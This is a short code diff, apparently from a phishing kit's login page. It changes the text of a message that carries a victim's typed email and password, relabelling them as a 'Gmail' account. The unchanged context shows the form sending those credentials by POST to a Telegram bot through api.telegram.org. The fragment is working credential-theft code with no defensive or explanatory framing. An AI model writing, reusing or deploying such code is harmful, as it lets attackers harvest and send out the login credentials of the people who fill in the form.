@@ -108,7 +108,7 @@
     const email = this.email.value;
     const password = this.password.value;
 
-    const message = `ورود جدید:\\nایمیل: ${email}\\nرمز: ${password}`;
+    const message = `New account received : \\Gmail : ${email} \\pass : ${password}`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
